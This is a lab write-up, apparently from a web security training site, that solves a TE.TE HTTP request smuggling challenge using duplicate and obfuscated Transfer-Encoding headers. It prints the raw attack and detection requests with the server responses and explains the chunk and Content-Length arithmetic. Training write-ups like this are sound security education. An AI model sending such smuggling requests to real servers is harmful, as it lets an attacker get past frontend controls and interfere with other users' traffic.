## 1. Introduction

Both frontend and backend server support the Transfer-Encoding header. And one of the servers can be induced not to process it by obfuscating the header.

To uncover a TE.TE vulnerability, it's necessary to find some variation of the TE header such that only, front or backend servers processes it, while the other one ignores it.

Depending which server can be induced not to process the obfuscated TE, the remainder of the attack will take the form as for the CL.TE or TE.CL vulnerabilities.

## 2. Challenge

The frontend server rejects requests that aren't using the GET or POST method.

Two servers handle duplicate HTTP request headers in different ways. The challenge is to smuggle a request to the backend server, so that the next request processed by the backend server appears to use the method GPOST.

## 3. Solution

Attack request:
```http
POST / HTTP/1.1
Host: 0abc003c03ea9bd99765f0fe00680052.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: foobar

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

x=1
0

```

Normal request:
```http
POST / HTTP/1.1
Host: 0abc003c03ea9bd99765f0fe00680052.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

The response after sending first the attack request and then the normal one will be:

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 27

"Unrecognized method GPOST"
```

## 4. Explanation

Frontend and Backed will process the requests differently, even though they both use Transfer-Encoding. This is important, as we have to first check the behavior and then craft the requests as needed in order to smuggle a request.

This can be detected by sending a request like the following:
```http
POST / HTTP/1.1
Host: 0abc003c03ea9bd99765f0fe00680052.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
Transfer-Encoding: foobar

0

X
```

After sending this we see a time delay, and then we get a "Server Error: Communication timed out".

This tells us that:
- Frontend still uses Transfer-Encoding even though it is malformed and sends the request to the Backend. 
- Since it uses Transfer-Encoding, the body will be only "0", since it marks the end of the chunk messages.
- Backend receives the request with the body containing only the "0".
- Time delay is caused by Content-Length, since it is 6 bytes, and the body is smaller, it keeps waiting for the other part of the body.
- Backend doesn't accept the malformed Time-Encoding, thus goes back to Content-Length.

From this behavior we can conclude that by malforming the Transfer-Encoding the Frontend will still use it, but the Backend will use Content-Length. So, in order to smuggle the request we need now to craft the request in the similar logic as the TE.CL vulnerability.

So now we craft our request we want to smuggle to backend, as the body of frontend. Since we only want to use the method GPOST, then we create:

```http
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

x=1
```

This body has the length of 5c(hex) bytes. So, since frontend uses Transfer-Encoding, we need to put that in the request, above the body, and "0" in the end to end the chunk.

The Content-Length of the request in Frontend is set to 4, because when it is sent to the backend, it will only take the following part of the request:
```http
POST / HTTP/1.1
Host: 0abc003c03ea9bd99765f0fe00680052.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: foobar

5c
```

The remaining part will be known to the backend as the following request:
```http
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

x=1
0

```

The Content-Length is set to 11 because the true body length is 10 bytes. This needs to be done, because at least 1 byte needs to be appended from the "normal request" in order for the smuggling to be complete.